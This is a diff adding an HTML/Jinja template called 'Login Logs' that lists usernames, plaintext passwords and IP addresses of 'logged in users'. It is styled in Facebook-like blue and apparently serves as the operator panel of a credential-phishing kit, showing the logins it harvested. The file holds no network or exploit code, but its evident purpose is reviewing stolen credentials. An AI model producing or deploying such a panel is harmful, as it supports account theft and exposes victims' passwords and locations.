@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Logs</title>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f4f4f4; }
+        table { width: 100%; border-collapse: collapse; background: white; }
+        th, td { padding: 10px; border: 1px solid #ccc; }
+        th { background: #1877f2; color: white; }
+    </style>
+</head>
+<body>
+    <h2>Logged In Users</h2>
+    <table>
+        <tr><th>Username</th><th>Password</th><th>IP Address</th></tr>
+        {% for u in users %}
+        <tr>
+            <td>{{ u[0] }}</td>
+            <td>{{ u[1] }}</td>
+            <td>{{ u[2] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
